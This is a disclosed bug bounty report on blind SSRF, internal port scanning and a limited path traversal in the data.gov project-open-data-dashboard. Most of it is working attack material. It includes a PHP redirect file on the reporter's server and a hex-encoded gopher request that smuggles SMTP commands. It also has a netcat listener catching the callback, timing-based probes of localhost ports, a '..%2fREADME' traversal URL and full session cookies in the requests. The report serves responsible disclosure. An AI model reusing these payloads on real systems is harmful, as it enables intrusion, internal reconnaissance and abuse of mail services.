# Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint

## Report Details
- **Report ID**: 895696
- **URL**: https://hackerone.com/reports/895696
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-10T22:08:04.628Z
- **Disclosed**: 2020-07-10T00:30:28.740Z

## Reporter
- **Username**: mariuszdeepsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
## Summary:
Due to improper routes handling multiple malicious actions are possible. Attacker is able to call Class/Function/Param1/Param2 directly from source code. this may lead to call function that should be not accessible from GUI.

Any Class from 
https://github.com/GSA/project-open-data-dashboard/tree/master/application/controllers
Can be called and any function as all of them are public.

## Description:
Below we present example function call from routes. As example we present "json_status" function located at
https://github.com/GSA/project-open-data-dashboard/blob/f29c98267f7d843e82bfdd0f61a8272a6225aeb6/application/controllers/Campaign.php#L1048

Following URL Allow to call "json_status" function
Function definition is following:
```
    public function json_status($status, $real_url = null, $component = null)
```

To call function parameters we have to call following URL:
https://labs.data.gov/dashboard/Campaign/json_status/$status/$real_url/$component

Example URL will call SSRF to localhost using gopher protocol:
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1/

Due to this functionality multiple actions was possible


## SSRF:

1. Prepare malicious php file on VPS
**o.php
```
root@vps778339:/var/www/html# cat o.php
<?php
$s = $_GET["s"];
header("Location: ".$s);
?>
```

2. Send request to "json_status" function as below described.

POC
---

**Request to send gopher request:
```
GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
Upgrade-Insecure-Requests: 1
DNT: 1
```

** Netcat from server:
```
root@vps778339:/var/www/html#
root@vps778339:/var/www/html#
root@vps778339:/var/www/html#
root@vps778339:/var/www/html# nc -lvp 25
Listening on [0.0.0.0] (family 0, port 25)
Connection from ec2-18-213-100-122.compute-1.amazonaws.com 21688 received!
HELO test.org%0d%0aMAIL FROM: %0d%0aRCPT TO:kontakt@deepsec.pl%0d%0aDATA%0d%0aTest%0d%0a.
root@vps778339:/var/www/html# nc -lvp 25
Listening on [0.0.0.0] (family 0, port 25)
Connection from ec2-18-213-100-122.compute-1.amazonaws.com 43055 received!
HELO test.org
MAIL FROM:
RCPT TO:kontakt@deepsec.pl
DATA
Test
.
root@vps778339:/var/www/html#
```

**Request:
```
GET /dashboard/Campaign/json_status/http%3A%2F%2F51.178.47.176%2Fo.php%3Fs%3Dhttp%3A%2F%2F51.178.47.176%2Ftest HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
Upgrade-Insecure-Requests: 1
DNT: 1
```

**Part of log file:
```
ler"
18.213.100.122 - - [10/Jun/2020:23:25:50 +0200] "HEAD /test HTTP/1.1" 200 200 "-" "Data.gov data.json crawler"
18.213.100.122 - - [10/Jun/2020:23:25:50 +0200] "HEAD /test HTTP/1.1" 200 200 "-" "Data.gov data.json crawler"
18.213.100.122 - - [10/Jun/2020:23:25:50 +0200] "GET /test HTTP/1.1" 200 205 "-" "Data.gov data.json crawler"
```

Check if local port is OPEN due to response time or timeout and gopher protocol.
--

Closed  port "4445" scenario
---
Request
```
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A4445 HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
Upgrade-Insecure-Requests: 1
DNT: 1
```

Response time - 163 milliseconds
---
```
HTTP/1.1 200 OK
Date: Wed, 10 Jun 2020 22:01:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: max-age=0, no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: -1
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, PUT, GET, DELETE, OPTIONS
Referrer-Policy: origin
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Set-Cookie: citrix_ns_id=V6DFBFvHdbloNzsXYUzRgEDaxMQ0002; Domain=.data.gov; Path=/; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wlf=AAAAAAXEw6HEe4o1Cxekp1iLlT73fDFKjSVqt3yaBcynLQLijox1_gtswdWWg5IOnZnVT6k4mONlxe5iAVstYUzN7TAFWPJFVCcQSRO0POEEN_AqFQ==&AAAAAAVNIok4r26-l3dSvg8n4ZfZJ37Wpn-ZwUcwWh_6fOAwKJnh-sw5RY6U7ywhAMLxEMiOEw7RoBUyzx7NbRfMp-zAZog_Q7azF9KsFo-jJ5nwEw==&; Domain=.data.gov; Max-Age=604800; Path=/; Version=1; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wat=AAAAAAWlKuAUjIivKHq_TzdkV64qXJJt7Qqj8fXU71deDgdKvHiqLsiRBDS4vnmJMRxoRYyuRmTbJndfxSGMHy7pq-J_&; Domain=.data.gov; Path=/; Secure; HttpOnly
Content-Length: 0
```

Open port "443" scenario lead to 502 gateway timeout
---
Request
```
GET /dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A443 HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_session_dashboard=edfaf301c4e59b7738f32c01e3d3b7da962efe7c
Upgrade-Insecure-Requests: 1
DNT: 1
```

Response
```
HTTP/1.1 504 Gateway Time-out
Date: Wed, 10 Jun 2020 21:59:23 GMT
Content-Type: text/html
Connection: close
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Set-Cookie: citrix_ns_id=8E6YqKIHpDnlELCEZHQGi6/DbMc0002; Domain=.data.gov; Path=/; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wlf=AAAAAAXN5F16ey5zISfQ585lXQBGHlN-7dr9WKl_OFLsX_Q6Z5FSkI1y5osrgkCJi30EZN3BqgmpbDGukEtJm4GeqYoRcF1ShGz2vNsMLkPUnGJfMg==&AAAAAAXr_jOkM7gR-f7M4RoCUEgFaXqHkFZh1c2M_0VcuOMELZ4L1xjh_7Cg7-1hFJ019Co3chJ3Y6GOPx3937UBarN6bbiMCl_jnjn3xYOPDRvJ2w==&; Domain=.data.gov; Max-Age=604800; Path=/; Version=1; Secure; HttpOnly
Set-Cookie: citrix_ns_id_.data.gov_%2F_wat=AAAAAAUCRwLvsF1G93DnYnM3tfgy7WeGLO5AGxKuZ4E4g06xunWnhmGEOXaEsURmVksrMxmgclkLw2DWjtRZmysJshVE&; Domain=.data.gov; Path=/; Secure; HttpOnly
X-Cache-Control-Orig: 
Cache-Control: max-age=0, must-revalidate, private
X-Expires-Orig: None
Content-Length: 160

<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>
```

PORT 25  - open
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A25 - TIMEOUT

PORT 8080 - closed
https://labs.data.gov/dashboard/Campaign/json_status/gopher%3A%2F%2F127.0.0.1%3A8080 - 157 m/s response time


## Read file from /root catalog README.md
In this usage of routes functionality we will present limited Local life inclusion, we escaped desired catalog "documentation" and called README.md, this vulnerability is limited due to ".md" added to string function parameter at
https://github.com/GSA/project-open-data-dashboard/blob/master/application/controllers/Docs.php#L30

POC
---
read README.md from my root dir.
```
https://labs.data.gov/dashboard/Docs/index/..%2fREADME
```
Function called "Docs" param $page = ..%2fREADME

This vuln is limited due to ".md" hardcoded

```
	public function index($page = 'main')
	{

		$data = array();

		$docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/';
		$docs_path = $docs_path	. $page . '.md';
		$docs = @file_get_contents($docs_path);
```


## Call other function not enabled in GUI
https://labs.data.gov/dashboard/user/metadata -> SAML Metadata clicking logo allow to find new components (https://labs.data.gov/dashboard/simplesaml/module.php/core/frontpage_welcome.php)
https://labs.data.gov/dashboard/user/acs -> stack traces enabled

## Impact

Call not available from GUI Function that may lead to critical problems.

## Attachments
- ssrf_request_on_our_vps.png
- gopher_enabled.png
- gopher_call_request.png
- LFI_limited.png
- other1.png
- other2.png
- other3.png
